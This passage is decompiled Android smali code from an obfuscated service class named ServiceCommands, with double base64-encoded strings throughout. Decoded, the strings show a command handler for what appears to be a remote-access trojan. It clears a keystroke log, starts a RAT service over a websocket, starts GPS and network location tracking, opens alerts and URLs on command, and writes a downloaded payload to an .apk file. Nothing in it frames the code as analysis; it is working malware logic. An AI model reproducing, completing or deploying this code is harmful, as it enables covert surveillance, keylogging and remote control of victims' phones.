    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v13, v5}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v12, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v6, v0, v11, v5}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v6, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "WTJ4bFlYST0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_10c0

    const-string v5, "YTJWNWN5NXNiMmM9"

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lnaqsl/ebxcb/exu/ServiceCommands;->fddo(Ljava/lang/String;)V
    :try_end_10be
    .catch Ljava/lang/Exception; {:try_start_1026 .. :try_end_10be} :catch_10bf

    goto :goto_10c0

    :catch_10bf
    nop

    :cond_10c0
    :goto_10c0
    aget-object v5, v2, v3

    const-string v6, "ZkhOMFlYSjBjbUYwUFE9PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_113f

    :try_start_10d2
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v6, v2, v3

    const-string v11, "ZkdWdVpISmhkRDA9"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "ZkdWdVpIVnliQT09"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v6, v11, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "UlZKU1QxST0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "ZDJWaWMyOWphMlYwSUhOMFlYSjBJQT09"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v6, v11}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v11, "ZDJWaWMyOWphMlYw"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v0, v11, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-class v11, Lnaqsl/ebxcb/exu/ServiceRAT;

    invoke-virtual {v5, v6, v11}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v5

    if-nez v5, :cond_113f

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    iget-object v11, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-class v12, Lnaqsl/ebxcb/exu/ServiceRAT;

    invoke-direct {v6, v11, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v5, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_113d
    .catch Ljava/lang/Exception; {:try_start_10d2 .. :try_end_113d} :catch_113e

    goto :goto_113f

    :catch_113e
    nop

    :cond_113f
    :goto_113f
    aget-object v5, v2, v3

    const-string v6, "YzNSaGNuUm1iM0ozWVhKa1BRPT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_119f

    :try_start_1151
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v5, v0}, Lnaqsl/ebxcb/exu/int;->int(Landroid/content/Context;)V

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v6, v2, v3

    const-string v11, "YzNSaGNuUm1iM0ozWVhKa1BRPT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "ZkdWdVpHWnZjbmRoY21RPQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v6, v11, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "S2lveU1Tbz0="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "SXc9PQ=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v11, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v6, v0, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_119d
    .catch Ljava/lang/Exception; {:try_start_1151 .. :try_end_119d} :catch_119e

    goto :goto_119f

    :catch_119e
    nop

    :cond_119f
    :goto_119f
    aget-object v5, v2, v3

    const-string v6, "YzNSdmNHWnZjbmRoY21RPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_11c7

    :try_start_11b1
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v5, v0}, Lnaqsl/ebxcb/exu/int;->int(Landroid/content/Context;)V

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "SXlNeU1TTT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v0, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_11c5
    .catch Ljava/lang/Exception; {:try_start_11b1 .. :try_end_11c5} :catch_11c6

    goto :goto_11c7

    :catch_11c6
    nop

    :cond_11c7
    :goto_11c7
    aget-object v5, v2, v3

    const-string v6, "Zkc5d1pXNWljbTkzYzJWeVBRPT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_122e

    :try_start_11d9
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v6, v2, v3

    const-string v11, "Zkc5d1pXNWljbTkzYzJWeVBRPT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "ZkdWdVpHSnliM2R6WlhJPQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v6, v11, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v6, Landroid/content/Intent;

    const-class v11, Lnaqsl/ebxcb/exu/Activity/ActivityAlert2;

    invoke-direct {v6, v0, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v11, "YzNSaGNuUT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "S2lwemRHRnlkR0p5ZFhKc0tpbz0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v6, v11, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_122c
    .catch Ljava/lang/Exception; {:try_start_11d9 .. :try_end_122c} :catch_122d

    goto :goto_122e

    :catch_122d
    nop

    :cond_122e
    :goto_122e
    aget-object v5, v2, v3

    const-string v6, "Zkc5d1pXNWhZM1JwZG1sMGVUMD0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1281

    :try_start_1240
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v6, v2, v3

    const-string v11, "Zkc5d1pXNWhZM1JwZG1sMGVUMD0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "ZkdWdVpHRmpkR2wyYVhSNQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v6, v11, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v6, Landroid/content/Intent;

    iget-object v11, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-class v12, Lnaqsl/ebxcb/exu/Activity/ActivityOpenURL;

    invoke-direct {v6, v11, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v11, "ZFhKcw=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v11, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v6, 0x800000

    invoke-virtual {v5, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_1281
    .catch Ljava/lang/Exception; {:try_start_1240 .. :try_end_1281} :catch_1281

    :catch_1281
    :cond_1281
    :try_start_1281
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v9, "Ym1WMGQyOXlhdz09"

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v6, v9}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static/range {v20 .. v20}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_12a7

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;

    invoke-direct {v5, v0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_12a7
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v9, "WjNCeg=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v6, v9}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static/range {v20 .. v20}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_12cf

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lnaqsl/ebxcb/exu/ServiceGeolocationGPS;

    invoke-direct {v5, v0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_12cd
    .catch Ljava/lang/Exception; {:try_start_1281 .. :try_end_12cd} :catch_12ce

    goto :goto_12cf

    :catch_12ce
    nop

    :cond_12cf
    :goto_12cf
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    iget-boolean v5, v5, Lnaqsl/ebxcb/exu/ifdf;->case:Z

    if-eqz v5, :cond_134d

    :try_start_12d5
    new-instance v5, Ljava/io/File;

    const-string v6, "WVhCcg=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6
    :try_end_12e1
    .catch Ljava/lang/Exception; {:try_start_12d5 .. :try_end_12e1} :catch_134d

    const/4 v9, 0x0

    :try_start_12e2
    invoke-virtual {v0, v6, v9}, Landroid/app/IntentService;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v6
    :try_end_12e6
    .catch Ljava/lang/Exception; {:try_start_12e2 .. :try_end_12e6} :catch_134e

    :try_start_12e6
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v10, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    invoke-virtual {v10}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, "TG1Gd2F3PT0="

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v5, v6, v9}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v6

    if-nez v6, :cond_134d

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v10, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v11, "TVRRPQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "Y0QweA=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v9, v10, v11, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v9}, Lnaqsl/ebxcb/exu/int;->ifdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v9

    const/16 v10, 0x3e8

    if-le v9, v10, :cond_134d

    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B

    move-result-object v6
    :try_end_133b
    .catch Ljava/lang/Exception; {:try_start_12e6 .. :try_end_133b} :catch_134d

    const/4 v9, 0x0

    :try_start_133c
    invoke-static {v6, v9}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v6

    new-instance v10, Ljava/io/FileOutputStream;
    :try_end_1342
    .catch Ljava/lang/Exception; {:try_start_133c .. :try_end_1342} :catch_134e

    const/4 v11, 0x1

    :try_start_1343
    invoke-direct {v10, v5, v11}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V

    invoke-virtual {v10, v6}, Ljava/io/FileOutputStream;->write([B)V

    invoke-virtual {v10}, Ljava/io/FileOutputStream;->close()V
    :try_end_134c
    .catch Ljava/lang/Exception; {:try_start_1343 .. :try_end_134c} :catch_134f

    goto :goto_134f

    :catch_134d
    :cond_134d
    const/4 v9, 0x0

    :catch_134e
    const/4 v11, 0x1

    :catch_134f
    :goto_134f
    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_7b4

    :cond_1353
    invoke-virtual/range {p0 .. p0}, Landroid/app/IntentService;->stopSelf()V

    return-void

    :catch_1357
    invoke-virtual/range {p0 .. p0}, Landroid/app/IntentService;->stopSelf()V

    return-void
.end method

.method fddo(Ljava/lang/String;)V
    .registers 5

    :try_start_0
    new-instance v0, Ljava/io/BufferedWriter;

    new-instance v1, Ljava/io/OutputStreamWriter;

    const/4 v2, 0x0

    invoke-virtual {p0, p1, v2}, Landroid/app/IntentService;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object p1

    invoke-direct {v1, p1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    const-string p1, ""

    invoke-virtual {v0, p1}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/BufferedWriter;->close()V
    :try_end_17
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_17} :catch_17

    :catch_17
    return-void
.end method

.method ifdf(Ljava/lang/String;)Ljava/lang/String;
    .registers 6

    const-string v0, ""

    :try_start_2
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/InputStreamReader;

    invoke-virtual {p0, p1}, Landroid/app/IntentService;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object p1

    invoke-direct {v2, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object p1, v0

    :goto_11
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_27

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1
    :try_end_26
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_26} :catch_28

    goto :goto_11

    :cond_27
    return-object p1

    :catch_28
    return-object v0
.end method

.method public onCreate()V
    .registers 1

    invoke-super {p0}, Landroid/app/IntentService;->onCreate()V

    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .registers 2

    iput-object p0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    :try_start_2
    invoke-virtual {p0}, Lnaqsl/ebxcb/exu/ServiceCommands;->fddo()V
    :try_end_5
    .catch Ljava/lang/NullPointerException; {:try_start_2 .. :try_end_5} :catch_5
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_5} :catch_5

    :catch_5
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 4

    invoke-super {p0, p1, p2, p3}, Landroid/app/IntentService;->onStartCommand(Landroid/content/Intent;II)I

    const/4 p1, 0x1

    return p1
.end method
